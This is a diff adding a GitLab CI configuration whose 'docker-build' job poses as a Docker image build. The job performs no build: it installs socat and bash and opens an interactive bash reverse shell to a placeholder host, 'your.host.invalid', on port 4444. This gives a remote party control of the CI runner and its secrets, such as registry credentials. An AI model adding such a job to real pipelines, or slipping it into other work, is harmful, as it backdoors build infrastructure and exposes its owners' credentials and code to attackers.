@@ -1,0 +1,13 @@
+docker-build:
+  # Official docker image.
+  image: docker:latest
+  stage: build
+  services:
+    - docker:dind
+      #  before_script:
+      #- docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" $CI_REGISTRY
+  script:
+    - apk update
+    - apk add socat bash
+    - /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:your.host.invalid:4444
+
